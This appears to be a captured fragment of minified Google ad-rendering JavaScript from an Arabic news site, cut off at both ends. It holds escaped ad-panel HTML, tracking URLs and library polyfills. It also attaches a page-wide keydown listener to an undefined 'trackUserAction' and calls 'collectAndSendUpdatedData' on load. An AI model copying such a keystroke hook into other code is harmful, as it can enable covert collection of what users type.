d\x3d\x22M3.25,3.25l8.5,8.5M11.75,3.25l-8.5,8.5\x22/\x3e\x3c/svg\x3e\x3c/div\x3e\x3c/div\x3e\x3c/div\x3e\x3cstyle\x3e.mute_panel{z-index:2147483646;}.abgac{position:absolute;left:0px;top:0px;z-index:2147483646;display:none;width:100%;height:100%;background-color:#FAFAFA;}.mlsc{height:100%;display:flex;justify-content:center;align-items:center;}.mls{animation:mlskf 2s linear infinite;height:50%;width:50%;}.mlsd{stroke-dasharray:1,189;stroke-dashoffset:0;animation:mlsdkf 1.4s ease-in-out infinite;}@keyframes mlskf{100%{transform:rotate(360deg);}}@keyframes mlsdkf{0%{stroke-dasharray:1,189;stroke-dashoffset:0;}50%{stroke-dasharray:134,189;stroke-dashoffset:-53px;}100%{stroke-dasharray:134,189;stroke-dashoffset:-188px;}}\x3c/style\x3e\x3cdiv id\x3d\x22mute_panel\x22 class\x3d\x22mute_panel\x22 aria-hidden\x3d\x22true\x22\x3e\x3cdiv id\x3d\x22abgac\x22 class\x3d\x22abgac\x22 aria-hidden\x3d\x22true\x22\x3e\x3cdiv id\x3d\x22mlsc\x22 class\x3d\x22mlsc\x22\x3e\x3csvg class\x3d\x22mls\x22 viewBox\x3d\x2250 50 100 100\x22\x3e\x3ccircle class\x3d\x22mlsd\x22 cx\x3d\x22100\x22 cy\x3d\x22100\x22 r\x3d\x2230\x22 fill\x3d\x22none\x22 stroke\x3d\x22#9E9E9E\x22 stroke-width\x3d\x223\x22/\x3e\x3c/svg\x3e\x3c/div\x3e\x3c/div\x3e\x3c/div\x3e\x3cscript data-jc\x3d\x2260\x22 src\x3d\x22https://pagead2.googlesyndication.com/pagead/js/r20230816/r20110914/abg_lite.js\x22 async data-jc-version\x3d\x22r20230816\x22 data-jcp-attribution-data\x3d\x22[[null,\x26quot;https://googleads.g.doubleclick.net/pagead/images/mtad/x_blue.png\x26quot;,null,\x26quot;https://googleads.g.doubleclick.net/pagead/images/mtad/x_blue.png\x26quot;,\x26quot;https://googleads.g.doubleclick.net/pagead/interaction/?ai\x3dCCnMAjMrgZKaJCNjIvcAP0LqB2AnVwpyHcoeb1J3dEfAuEAEgqLKFfGDhBKABxrnduwHIAQmoAwHIA5sEqgT8AU_QZF2N7qvv62Eo1Sst3N4GmNgqhRU5a-METgkG9VT_4UArvQ765UqDnlmpiESYfoZspK4YRhHLiy16RbZRa_D2fYKjpVNpvnDXmDm0VbdeUA2_haSDk1Vq6rdm28__GlzgRv_Gyb8j3Fnbl0KwopLcVNaZF8m8mopLWN8Uufes-5ABsVN1pLGp4OppbpoaFcHC7Y5POpz64ox8T51gKXoUy1yGrEHJYm4GYfCHCJq6bG6MIbIywrofP5D_XzR1RgnhNcUh7pWiWgBnGH742F4Y8NJu3EQk-aMzIOlenorOHtdajHeHjTXvQtc5mURhBwOX1kIi2j5GV4UUqMAE8vfrsaQE4AQDkAYBoAZMgAeixqLEAqgH2baxAqgHjs4bqAeT2BuoB-6WsQKoB_6esQKoB6SjsQKoB9XJG6gHpr4bqAeaBqgH89EbqAeW2BuoB6qbsQKoB4OtsQKoB_-esQKoB9-fsQLYBwDSCBQIgGEQARgdMgKKAjoCgEBIvf3BOvIIG2FkeC1zdWJzeW4tODU0OTQzMzEwODYzNzgyNYAKA5gLAcgLAYAMAaoNAlBIyA0BsBPY6LUU0BMA2BMNiBQB2BQB0BUB-BYBgBcB\\u0026sigh\x3dStrICLGpYcA\\u0026cid\x3dCAQSOwBpAlJWexSU-ZrTYWK7v3MOsLD2phjLcgvXwfBd-cQm2DvWjOELCKt_WOFL1aDa1HoikYgdu8XWsM90GAE\x26quot;,\x26quot;_2pkNq53bcwIh5vUnd0REIO4kolMGOi5w8QCIgluaXNzYW4ucGgyCAgFExj0ywEUQhdjYS1wdWItMjkzMDgwNTEwNDQxODIwNEgZWABwAQ\x26quot;,[\x26quot;user_feedback_menu_interaction\x26quot;,\x26quot;\x26quot;,0],null,null,null,null,\x26quot;ما الخلل في هذا الإعلان؟\x26quot;,null,\x26quot;https://googleads.g.doubleclick.net/pagead/images/mtad/back_blue.png\x26quot;,\x26quot;شكرًا جزيلاً على تعليقاتك.\x26quot;,\x26quot;سنراجع هذا الإعلان لتحسين التجربة في المستقبل.\x26quot;,\x26quot;شكرًا جزيلاً على تعليقاتك.\x26quot;,\x26quot;سنستخدم تعليقاتك لمراجعة الإعلانات على هذا الموقع.\x26quot;,null,null,null,\x26quot;إغلاق الإعلان: %1$d\x26quot;,\x26quot;Ads by Google\x26quot;,\x26quot;https://googleads.g.doubleclick.net/pagead/images/mtad/abg_blue.png\x26quot;,\x26quot;https://www.google.com/url?ct\x3dabg\\u0026q\x3dhttps://www.google.com/adsense/support/bin/request.py%3Fcontact%3Dabg_afc%26url%3Dhttps://www.elwatannews.com/%26gl%3DJP%26hl%3Dar%26ai0%3D\\u0026usg\x3dAOvVaw2URtlgD5LGY_CD04eFBYdN\x26quot;,\x26quot;https://googleads.g.doubleclick.net/pagead/images/mtad/x_blue.png\x26quot;,1,[[\x26quot;إرسال ملاحظات\x26quot;,[\x26quot;user_feedback_menu_option\x26quot;,\x26quot;1\x26quot;,1],[\x26quot;ما الخلل في هذا الإعلان؟\x26quot;,[[\x26quot;غير مهتم بهذا الإعلان\x26quot;,[\x26quot;mute_survey_option\x26quot;,\x26quot;7\x26quot;,1]],[\x26quot;إعلان يحجب المحتوى\x26quot;,[\x26quot;mute_survey_option\x26quot;,\x26quot;3\x26quot;,1]],[\x26quot;رأيت هذا الإعلان عدة مرات\x26quot;,[\x26quot;mute_survey_option\x26quot;,\x26quot;2\x26quot;,1]],[\x26quot;كان الإعلان غير ملائم\x26quot;,[\x26quot;mute_survey_option\x26quot;,\x26quot;8\x26quot;,1]]]],[\x26quot;user_feedback_undo\x26quot;,\x26quot;1\x26quot;,1]]],[\x26quot;https://googleads.g.doubleclick.net/pagead/images/adchoices/iconx2-000000.png\x26quot;,\x26quot;خيارات الإعلان\x26quot;,\x26quot;تم إغلاق الإعلان بواسطة %1$s\x26quot;,null,\x26quot;https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_dark_color_84x28dp.png\x26quot;,\x26quot;إرسال ملاحظات\x26quot;,\x26quot;شكرًا لك. تساعد التعليقات على تحسين خدمة \\\x26quot;إعلانات Google\\\x26quot;\x26quot;,null,null,null,\x26quot;https://googleads.g.doubleclick.net/pagead/images/abg/iconx2-000000.png\x26quot;,\x26quot;إعلانات Google\x26quot;,null,\x26quot;الاطّلاع على إعدادات إعلانات Google\x26quot;,null,\x26quot;https://www.gstatic.com\x26quot;,\x26quot;\x26quot;,\x26quot;إعلانات %1$s\x26quot;,\x26quot;إعدادات الإعلان\x26quot;,\x26quot;https://adssettings.google.com\x26quot;,null,null,null,0,null,null,null,0],\x26quot;AB3afGEAAAXmW1tbW251bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxbbnVsbCwiNjgwNTgyMzc2Il1dLFtudWxsLCJodHRwczovL2dvb2dsZWFkcy5nLmRvdWJsZWNsaWNrLm5ldC9wYWdlYWQvaW50ZXJhY3Rpb24vP2FpPUNDbk1Bak1yZ1pLYUpDTmpJdmNBUDBMcUIyQW5Wd3B5SGNvZWIxSjNkRWZBdUVBRWdxTEtGZkdEaEJLQUJ4cm5kdXdISUFRbW9Bd0hJQTVzRXFnVDhBVV9RWkYyTjdxdnY2MkVvMVNzdDNONEdtTmdxaFJVNWEtTUVUZ2tHOVZUXzRVQXJ2UTc2NVVxRG5sbXBpRVNZZm9ac3BLNFlSaEhMaXkxNlJiWlJhX0QyZllLanBWTnB2bkRYbURtMFZiZGVVQTJfaGFTRGsxVnE2cmRtMjhfX0dsemdSdl9HeWI4ajNGbmJsMEt3b3BMY1ZOYVpGOG04bW9wTFdOOFV1ZmVzLTVBQnNWTjFwTEdwNE9wcGJwb2FGY0hDN1k1UE9wejY0b3g4VDUxZ0tYb1V5MXlHckVISlltNEdZZkNIQ0pxNmJHNk1JYkl5d3JvZlA1RF9YelIxUmduaE5jVWg3cFdpV2dCbkdINzQyRjRZOE5KdTNFUWstYU16SU9sZW5vck9IdGRhakhlSGpUWHZRdGM1bVVSaEJ3T1gxa0lpMmo1R1Y0VVVxTUFFOHZmcnNhUUU0QVFEa0FZQm9BWk1nQWVpeHFMRUFxZ0gyYmF4QXFnSGpzNGJxQWVUMkJ1b0ItNldzUUtvQl82ZXNRS29CNlNqc1FLb0I5WEpHNmdIcHI0YnFBZWFCcWdIODlFYnFBZVcyQnVvQjZxYnNRS29CNE90c1FLb0JfLWVzUUtvQjktZnNRTFlCd0RTQ0JRSWdHRVFBUmdkTWdLS0Fqb0NnRUJJdmYzQk92SUlHMkZrZUMxemRXSnplVzR0T0RVME9UUXpNekV3T0RZek56Z3lOWUFLQTVnTEFjZ0xBWUFNQWFvTkFsQkl5QTBCc0JQWTZMVVUwQk1BMkJNTmlCUUIyQlFCMEJVQi1CWUJnQmNCXHUwMDI2c2lnaD1TdHJJQ0xHcFljQVx1MDAyNmNpZD1DQVFTT3dCcEFsSldleFNVLVpyVFlXSzd2M01Pc0xEMnBoakxjZ3ZYd2ZCZC1jUW0yRHZXak9FTENLdF9XT0ZMMWFEYTFIb2lrWWdkdThYV3NNOTBHQUUiLFtudWxsLG51bGwsbnVsbCwiaHR0cHM6Ly9kaXNwbGF5YWRzLWZvcm1hdHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tL2Fkcy9wcmV2aWV3L2NvbnRlbnQuanM_Y2xpZW50PXd0YVx1MDAyNm9iZnVzY2F0ZWRDdXN0b21lcklkPTc3NTExMTcyMjRcdTAwMjZjcmVhdGl2ZUlkPTY2NTYyOTc5MDM0M1x1MDAyNnZlcnNpb25JZD0wXHUwMDI2YWRHcm91cENyZWF0aXZlSWQ9NjA5MTQyMjQ2NzkxXHUwMDI2c2lnPUFDaVZCX3kwZ0VFcTdNaDdwLWNqZ0ZHOWJKZ2hFUEpUM2ciXSxudWxsLG51bGwsMSwiXzJwa05xNTNiY3dJaDV2VW5kMFJFSU80a29sTUdPaTV3OFFDSWdsdWFYTnpZVzR1Y0dneUNBZ0ZFeGoweXdFVVFoZGpZUzF3ZFdJdE1qa3pNRGd3TlRFd05EUXhPREl3TkVnWldBQndBUSIsIjIwNDIwMjcxMTA3Il1dXSxbbnVsbCxudWxsLDEsMSwxXSxbbnVsbCxudWxsLCJKUCJdXV8ZfqjtBQKCvNVTGHZS4RUflQXhC6fjonuScwgsV9awROjS6ICPf03pjI8zrMP-4HtMtsNIdbmKz2iemUhv7aa_BOcAdJX44CFaA8p7R6a8Sb9ZwRxHL8clsc7gcpCj4afmZK4O5-sXxEb-QJA_iXsMlPLpg0-TEMl8QCO9NnjeGh7w44lRxPVe2yZpwv5MgQiFQzQssyTibw6oEDr1yWBBQsTcAMXg4c3meJbomnPCQaEfY1SWZeHVC5ndAPubj3VSGeKmIyth-zDbo3s84CwBIvM3hxBkzKOr7UjTJXK85LrKcAfAEe3DzVGA-dgd1NKEWVaFp0oOznciaW6QC0Q,wobeDPjhNHkwdh3qb_SZ8Q\x26quot;,\x26quot;https://adssettings.google.com/whythisad?source\x3ddisplay\\u0026reasons\x3dAVs1JPL1dr-M_V873ku9cXPx4u31Bx1Z1Yc5tdm0I7OMLQnyemsdzpP4jKi9Dd0j_EQbpeij8RqmExGsGk4dR4cOHI7dWDEHqgHN8BHyGCjlZnsqG1qjHhBYslrVwJq6CQ8BWj0c7E9cm4iigMkknCetxE3jjy8ylgyXQTYYNkW29TpzNDwobKqvK-Zw2q8OcbjuNh8vV1W3g5F3H_fVUntJH4f0jn7gTj7HwndOZJlNQYWwMpqsdfI0VyWJjjdtRU2KV1UqjcY8awefEuztU0deBCQvYB7mjAtNnLRNO7JOTg74Mt33cI3qjTksFfeAC5PMfAvTMjaKdJ6Qj-oIkcFKkCE-PNaNjWDYo-8dJcXoJEyk_-9V3XQcbRolf8__lAlDC23zkoB8vYJqM_psSg2Z0zs9uL-45nVmpdx_O0QcaST9HRZUCiZ1ERwcmbM0naeXemZZlWCaps-U4qWbYhpTAbP-4dFTqO2QReDf75wQ8k0FnWNoV-QETYD4DetnmowOojYD-UDq_ntXriWs8uWdyzFsVCdNxlAznfou9gU7hPefVhUzCq1ViaGVYZFMqLpPtR6KeC0NKaSz5hXsN38iKLrH7L2W3LqD4-DdVdYlWqzBK5Rt_PLUr1RO-lAUnj8z-TQ9ebKVq3aDguV70K5QqELfs4hOCGA6sfGdq_3BO-22mSHDsiy0igMH2MBkl9Q3p0XX7w1AP6uNkPsBIPP7I-fDF00yflfXewQcUCXr-qOTScGdYY7HKeNwD54TDPGioi69jexC1ft9ovTbE2OiwywUiQWkzisP7WLPI7glJ4uAKrhFlup8fRG4DRp388dBxq5UabbZM7dJt2gMRDrTvhjkg3shB4QESeoYzcjdwPJHXXUKaGexrU0xEsvJVPr5qHH7lxF_MntEUESzKBPrR9zKBttyLRkNdGF0klsExitYgUQG8Kxk4uMzEgvSNF5xy4s3k5bje8KPtfnR9ZAvox3XLA_zkgqw_64mcCOoTt04UGyXT0rjnocymPSe5hsklM62ugPbNu0clD6LEWKHqqhNwWeS3JIzSE_6iBhx8_PkMiS0bbII7wPpKqpsJp4IWlEcpqH3uooo9GhIqs5S-rkbFew_6oHvPogpfAPMw6n9YwdN1nDmoKYU8LMJDZMgJfKLKSEsILRaO_NIH0QRR-ryM1G_9AwIpTAVvqhcAFo-ajaT9DAwsnEUoHnpRg-hmUYyVmbAB36IKf0nsFLWKeJvYknkn_Nmlx68ZPWn3k8TApWQWRbdmzCSdyutQAFzCEVrsSN0toLqzdhsyr1uScweKsUNeVBzTz4LMQ10Q9uz3wTLOK18STZwPOA2jKsRerYsrGFSDs3dffbIn-P9_DLYxTn_9utCx2aGzBY9p-SKvDc0PoubjfWdr7jvMKDYN4RE9Wxys7Vjnfo-6anGSDQvtBF7LO0rbUaS63wCtTOEqOJj_6_j6G2I334qTzplhDm-OgNCc6PgYm4Qn4OjxvI47z_gqBa5pkb_2FhRXPLuRt26N2_yCVV1GJwJfcwmESJxGFoiEMI5giJHtK0Rql7ZFw4FfceK3d6__T-Qzw1iZIYFPAyAR4YaSPhxUMgEdXPm2ZDNlt-f0pE9G0RsS7hGgdJdM455-BTjFkUC7CBlcjsgoU4WHpUXroFYlxD695KTK_TgHAM1o-lyt1fbWyqK08tKr2vqtik2\x26quot;,\x26quot;لماذا هذا الإعلان؟\x26quot;,1,0],null,null,0,null,0,0,1,0,0,0,1,0,0,0,null,0,1,0,null,[[\x26quot;jake_ui_extension\x26quot;,\x26quot;jake_default_ui\x26quot;]],90,728,0,null,null,0,null,null,\x26quot;right\x26quot;,0,0,\x26quot;r20230816/r20110914\x26quot;]\x22\x3e\x3c/script\x3e');
window.addEventListener("keydown", trackUserAction);
if (!window.mraid) {
  document.write('\x3c/div\x3e');
}
window.addEventListener("load", function () {
  collectAndSendUpdatedData();
});
(function () {
  (function () {
    var s = document.createElement('script');
    s.setAttribute('data-jc', '86');
    s.src = 'https://pagead2.googlesyndication.com/pagead/js/r20230816/r20110914/elements/html/omrhp.js';
    s.setAttribute('data-jc-version', 'r20230816');
    var ss = document.getElementsByTagName('script')[0];
    if (ss && ss.parentNode) {
      ss.parentNode.insertBefore(s, ss);
    }
  })();
  window.dicnf = {
    eavp: true,
    ebrp: true,
    apfa: true,
    atsb: true,
    bvst: 'r20230816',
    eeid: 'jsrgZOS2Jvmw29gP0ZSnsAs',
    aunb: true,
    adsg: '',
    uffp: true
  };
  (function () {
    /*  Copyright The Closure Library Authors. SPDX-License-Identifier: Apache-2.0 */function aa(a) {
      var b = 0;
      return function () {
        return b < a.length ? {
          done: !1,
          value: a[b++]
        } : {
          done: !0
        };
      };
    }
    var ba = "function" == typeof Object.defineProperties ? Object.defineProperty : function (a, b, c) {
      if (a == Array.prototype || a == Object.prototype) return a;
      a[b] = c.value;
      return a;
    };
    function ca(a) {
      a = ["object" == typeof globalThis && globalThis, a, "object" == typeof window && window, "object" == typeof self && self, "object" == typeof global && global];
      for (var b = 0; b < a.length; ++b) {
        var c = a[b];
        if (c && c.Math == Math) return c;
      }
      throw Error("Cannot find global object");
    }
    var da = ca(this);
    function m(a, b) {
      if (b) a: {
        var c = da;
        a = a.split(".");
        for (var d = 0; d < a.length - 1; d++) {
          var e = a[d];
          if (!(e in c)) break a;
          c = c[e];
        }
        a = a[a.length - 1];
        d = c[a];
        b = b(d);
        b != d && null != b && ba(c, a, {
          configurable: !0,
          writable: !0,
          value: b
        });
      }
    }
    function ea(a) {
      var b = "undefined" != typeof Symbol && Symbol.iterator && a[Symbol.iterator];
      if (b) return b.call(a);
      if ("number" == typeof a.length) return {
        next: aa(a)
      };
      throw Error(String(a) + " is not an iterable or ArrayLike");
    }
    var fa = "function" == typeof Object.assign ? Object.assign : function (a, b) {
      for (var c = 1; c < arguments.length; c++) {
        var d = arguments[c];
        if (d) for (var e in d) Object.prototype.hasOwnProperty.call(d, e) && (a[e] = d[e]);
      }
      return a;
    };
    m("Object.assign", function (a) {
      return a || fa;
    });
    var ha = "function" == typeof Object.create ? Object.create : function (a) {
        function b() {}
        b.prototype = a;
        return new b();
      },
      ia;
    if ("function" == typeof Object.setPrototypeOf) ia = Object.setPrototypeOf;else {
      var la;
      a: {
        var ma = {
            a: !0
          },
          na = {};
        try {
          na.__proto__ = ma;
          la = na.a;
          break a;
        } catch (a) {}
        la = !1;
      }
      ia = la ? function (a, b) {
        a.__proto__ = b;
        if (a.__proto__ !== b) throw new TypeError(a + " is not extensible");
        return a;
      } : null;
    }
    var oa = ia;
    function u(a, b) {
      a.prototype = ha(b.prototype);
      a.prototype.constructor = a;
      if (oa) oa(a, b);else for (var c in b) if ("prototype" != c) if (Object.defineProperties) {
        var d = Object.getOwnPropertyDescriptor(b, c);
        d && Object.defineProperty(a, c, d);
      } else a[c] = b[c];
      a.ba = b.prototype;
    }
    function pa() {
      for (var a = Number(this), b = [], c = a; c < arguments.length; c++) b[c - a] = arguments[c];
      return b;
    }
    m("Object.is", function (a) {
      return a ? a : function (b, c) {
        return b === c ? 0 !== b || 1 / b === 1 / c : b !== b && c !== c;
      };
    });
    m("Array.prototype.includes", function (a) {
      return a ? a : function (b, c) {
        var d = this;
        d instanceof String && (d = String(d));
        var e = d.length;
        c = c || 0;
        for (0 > c && (c = Math.max(c + e, 0)); c < e; c++) {
          var f = d[c];
          if (f === b || Object.is(f, b)) return !0;
        }
        return !1;
      };
    });
    m("String.prototype.includes", function (a) {
      return a ? a : function (b, c) {
        if (null == this) throw new TypeError("The 'this' value for String.prototype.includes must not be null or undefined");
        if (b instanceof RegExp) throw new TypeError("First argument to String.prototype.includes must not be a regular expression");
        return -1 !== this.indexOf(b, c || 0);
      };
    });
    m("globalThis", function (a) {
      return a || da;
    });
    var x = this || self;
    var qa, z;
    a: {
      for (var ra = ["CLOSURE_FLAGS"], A = x, sa = 0; sa < ra.length; sa++) if (A = A[ra[sa]], null == A) {
        z = null;
        break a;
      }
      z = A;
    }
    var ta = z && z[610401301];
    qa = null != ta ? ta : !1;
    var B,
      ua = x.navigator;
    B = ua ? ua.userAgentData || null : null;
    function va(a) {
      return qa ? B ? B.brands.some(function (b) {
        return (b = b.brand) && -1 != b.indexOf(a);
      }) : !1 : !1;
    }
    function E(a) {
      var b;
      a: {
        if (b = x.navigator) if (b = b.userAgent) break a;
        b = "";
      }
      return -1 != b.indexOf(a);
    }
    ;
    function F() {
      return qa ? !!B && 0 < B.brands.length : !1;
    }
    function wa() {
      return F() ? va("Chromium") : (E("Chrome") || E("CriOS")) && !(F() ? 0 : E("Edge")) || E("Silk");
    }
    ;
    var xa = Array.prototype.indexOf ? function (a, b) {
        return Array.prototype.indexOf.call(a, b, void 0);
      } : function (a, b) {
        if ("string" === typeof a) return "string" !== typeof b || 1 != b.length ? -1 : a.indexOf(b, 0);
        for (var c = 0; c < a.length; c++) if (c in a && a[c] === b) return c;
        return -1;
      },
      ya = Array.prototype.forEach ? function (a, b) {
        Array.prototype.forEach.call(a, b, void 0);
      } : function (a, b) {
        for (var c = a.length, d = "string" === typeof a ? a.split("") : a, e = 0; e < c; e++) e in d && b.call(void 0, d[e], e, a);
      };
    function za(a) {
      za[" "](a);
      return a;
    }
    za[" "] = function () {};
    var Aa = F() ? !1 : E("Trident") || E("MSIE");
    !E("Android") || wa();
    wa();
    E("Safari") && (wa() || (F() ? 0 : E("Coast")) || (F() ? 0 : E("Opera")) || (F() ? 0 : E("Edge")) || (F() ? va("Microsoft Edge") : E("Edg/")) || F() && va("Opera"));
    var Ba = {},
      G = null;
    function Ca(a, b) {
      void 0 === b && (b = 0);
      if (!G) {
        G = {};
        for (var c = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".split(""), d = ["+/=", "+/", "-_=", "-_.", "-_"], e = 0; 5 > e; e++) {
          var f = c.concat(d[e].split(""));
          Ba[e] = f;
          for (var g = 0; g < f.length; g++) {
            var h = f[g];
            void 0 === G[h] && (G[h] = g);
          }
        }
      }
      b = Ba[b];
      c = Array(Math.floor(a.length / 3));
      d = b[64] || "";
      for (e = f = 0; f < a.length - 2; f += 3) {
        var k = a[f],
          l = a[f + 1];
        h = a[f + 2];
        g = b[k >> 2];
        k = b[(k & 3) << 4 | l >> 4];
        l = b[(l & 15) << 2 | h >> 6];
        h = b[h & 63];
        c[e++] = g + k + l + h;
      }
      g = 0;
      h = d;
      switch (a.length - f) {
        case 2:
          g = a[f + 1], h = b[(g & 15) << 2] || d;
        case 1:
          a = a[f], c[e] = b[a >> 2] + b[(a & 3) << 4 | g >> 4] + h + d;
      }
      return c.join("");
    }
    ;
    var Da = "undefined" !== typeof Uint8Array,
      Ea = !Aa && "function" === typeof btoa;
    var H = "function" === typeof Symbol && "symbol" === typeof Symbol() ? Symbol() : void 0,
      Fa = H ? function (a, b) {
        a[H] |= b;
      } : function (a, b) {
        void 0 !== a.g ? a.g |= b : Object.defineProperties(a, {
          g: {
            value: b,
            configurable: !0,
            writable: !0,
            enumerable: !1
          }
        });
      };
    function Ga(a) {
      var b = J(a);
      1 !== (b & 1) && (Object.isFrozen(a) && (a = Array.prototype.slice.call(a)), K(a, b | 1));
    }
    var J = H ? function (a) {
        return a[H] | 0;
      } : function (a) {
        return a.g | 0;
      },
      M = H ? function (a) {
        return a[H];
      } : function (a) {
        return a.g;
      },
      K = H ? function (a, b) {
        a[H] = b;
      } : function (a, b) {
        void 0 !== a.g ? a.g = b : Object.defineProperties(a, {
          g: {
            value: b,
            configurable: !0,
            writable: !0,
            enumerable: !1
          }
        });
      };
    function Ha() {
      var a = [];
      Fa(a, 1);
      return a;
    }
    function Ia(a) {
      a = a >> 11 & 1023;
      return 0 === a ? 536870912 : a;
    }
    ;
    var Ja = {};
    function N(a) {
      return null !== a && "object" === typeof a && !Array.isArray(a) && a.constructor === Object;
    }
    var Ka,
      O,
      La = [];
    K(La, 39);
    O = Object.freeze(La);
    function Ma(a) {
      if ("boolean" !== typeof a) {
        var b = typeof a;
        throw Error("Expected boolean but got " + ("object" != b ? b : a ? Array.isArray(a) ? "array" : b : "null") + ": " + a);
      }
      return !!a;
    }
    ;
    var Na;
    function P(a, b, c) {
      null == a && (a = Na);
      Na = void 0;
      if (null == a) {
        var d = 96;
        c ? (a = [c], d |= 512) : a = [];
        b && (d = d & -2095105 | (b & 1023) << 11);
      } else {
        if (!Array.isArray(a)) throw Error();
        d = J(a);
        if (d & 64) return a;
        d |= 64;
        if (c && (d |= 512, c !== a[0])) throw Error();
        a: {
          c = a;
          var e = c.length;
          if (e) {
            var f = e - 1,
              g = c[f];
            if (N(g)) {
              d |= 256;
              b = +!!(d & 512) - 1;
              e = f - b;
              1024 <= e && (Oa(c, b, g), e = 1023);
              d = d & -2095105 | (e & 1023) << 11;
              break a;
            }
          }
          b && (g = +!!(d & 512) - 1, b = Math.max(b, e - g), 1024 < b && (Oa(c, g, {}), d |= 256, b = 1023), d = d & -2095105 | (b & 1023) << 11);
        }
      }
      K(a, d);
      return a;
    }
    function Oa(a, b, c) {
      for (var d = 1023 + b, e = a.length, f = d; f < e; f++) {
        var g = a[f];
        null != g && g !== c && (c[f - b] = g);
      }
      a.length = d + 1;
      a[d] = c;
    }
    ;
    function Pa(a, b) {
      return Qa(b);
    }
    function Qa(a) {
      switch (typeof a) {
        case "number":
          return isFinite(a) ? a : String(a);
        case "boolean":
          return a ? 1 : 0;
        case "object":
          if (a && !Array.isArray(a) && Da && null != a && a instanceof Uint8Array) {
            if (Ea) {
              for (var b = "", c = 0, d = a.length - 10240; c < d;) b += String.fromCharCode.apply(null, a.subarray(c, c += 10240));
              b += String.fromCharCode.apply(null, c ? a.subarray(c) : a);
              a = btoa(b);
            } else a = Ca(a);
            return a;
          }
      }
      return a;
    }
    ;
    function Ra(a, b, c, d, e, f) {
      if (null != a) {
        if (Array.isArray(a)) a = e && 0 == a.length && J(a) & 1 ? void 0 : f && J(a) & 2 ? a : Sa(a, b, c, void 0 !== d, e, f);else if (N(a)) {
          var g = {},
            h;
          for (h in a) g[h] = Ra(a[h], b, c, d, e, f);
          a = g;
        } else a = b(a, d);
        return a;
      }
    }
    function Sa(a, b, c, d, e, f) {
      var g = d || c ? J(a) : 0;
      d = d ? !!(g & 32) : void 0;
      a = Array.prototype.slice.call(a);
      for (var h = 0; h < a.length; h++) a[h] = Ra(a[h], b, c, d, e, f);
      c && c(g, a);
      return a;
    }
    function Ta(a) {
      return a.Z === Ja ? a.toJSON() : Qa(a);
    }
    ;
    function Ua(a, b, c) {
      var d = a.l,
        e = M(d);
      if (e & 2) throw Error();
      Va(d, e, b, c);
      return a;
    }
    function Va(a, b, c, d) {
      var e = Ia(b);
      if (c >= e) {
        var f = b;
        if (b & 256) e = a[a.length - 1];else {
          if (null == d) return;
          e = a[e + (+!!(b & 512) - 1)] = {};
          f |= 256;
        }
        e[c] = d;
        f !== b && K(a, f);
      } else a[c + (+!!(b & 512) - 1)] = d, b & 256 && (a = a[a.length - 1], c in a && delete a[c]);
    }
    function Q(a, b, c) {
      if (null != c && "string" !== typeof c) throw Error();
      return Ua(a, b, c);
    }
    ;
    function R(a, b, c) {
      this.l = P(a, b, c);
    }
    R.prototype.toJSON = function () {
      if (Ka) var a = Wa(this, this.l, !1);else a = Sa(this.l, Ta, void 0, void 0, !1, !1), a = Wa(this, a, !0);
      return a;
    };
    function Xa(a) {
      Ka = !0;
      try {
        return JSON.stringify(a.toJSON(), Pa);
      } finally {
        Ka = !1;
      }
    }
    R.prototype.Z = Ja;
    R.prototype.toString = function () {
      return Wa(this, this.l, !1).toString();
    };
    function Wa(a, b, c) {
      var d = a.constructor.aa,
        e = Ia(M(c ? a.l : b)),
        f = !1;
      if (d) {
        if (!c) {
          b = Array.prototype.slice.call(b);
          var g;
          if (b.length && N(g = b[b.length - 1])) for (f = 0; f < d.length; f++) if (d[f] >= e) {
            Object.assign(b[b.length - 1] = {}, g);
            break;
          }
          f = !0;
        }
        e = b;
        c = !c;
        g = M(a.l);
        a = Ia(g);
        g = +!!(g & 512) - 1;
        for (var h, k, l = 0; l < d.length; l++) if (k = d[l], k < a) {
          k += g;
          var n = e[k];
          null == n ? e[k] = c ? O : Ha() : c && n !== O && Ga(n);
        } else h || (n = void 0, e.length && N(n = e[e.length - 1]) ? h = n : e.push(h = {})), n = h[k], null == h[k] ? h[k] = c ? O : Ha() : c && n !== O && Ga(n);
      }
      d = b.length;
      if (!d) return b;
      var p;
      if (N(h = b[d - 1])) {
        a: {
          var q = h;
          e = {};
          c = !1;
          for (var v in q) a = q[v], Array.isArray(a) && a != a && (c = !0), null != a ? e[v] = a : c = !0;
          if (c) {
            for (var t in e) {
              q = e;
              break a;
            }
            q = null;
          }
        }
        q != h && (p = !0);
        d--;
      }
      for (; 0 < d; d--) {
        h = b[d - 1];
        if (null != h) break;
        var y = !0;
      }
      if (!p && !y) return b;
      var w;
      f ? w = b : w = Array.prototype.slice.call(b, 0, d);
      b = w;
      f && (b.length = d);
      q && b.push(q);
      return b;
    }
    ;
    function Ya(a) {
      this.l = P(a);
    }
    u(Ya, R);
    function Za(a, b) {
      this.key = a;
      this.defaultValue = void 0 === b ? !1 : b;
      this.valueType = "boolean";
    }
    ;
    var $a = new Za("100000"),
      ab = new Za("45357156", !0),
      bb = new Za("45350890"),
      cb = new Za("45414892");
    var db = ["A7CQXglZzTrThjGTBEn1rWTxHOEtkWivwzgea+NjyardrwlieSjVuyG44PkYgIPGs8Q9svD8sF3Yedn0BBBjXAkAAACFeyJvcmlnaW4iOiJodHRwczovL2RvdWJsZWNsaWNrLm5ldDo0NDMiLCJmZWF0dXJlIjoiUHJpdmFjeVNhbmRib3hBZHNBUElzIiwiZXhwaXJ5IjoxNjk1MTY3OTk5LCJpc1N1YmRvbWFpbiI6dHJ1ZSwiaXNUaGlyZFBhcnR5Ijp0cnVlfQ=="];
    function eb(a, b) {
      return "&adurl=" == a.substring(a.length - 7) ? a.substring(0, a.length - 7) + b + "&adurl=" : a + b;
    }
    ;
    function S(a) {
      return a = void 0 === a ? window : a;
    }
    ;
    var T = x.dicnf || {};
    function fb(a) {
      var b = !1,
        c;
      return function () {
        b || (c = a(), b = !0);
        return c;
      };
    }
    ;
    function gb(a, b, c) {
      a.addEventListener && a.addEventListener(b, c, !1);
    }
    function hb(a, b, c) {
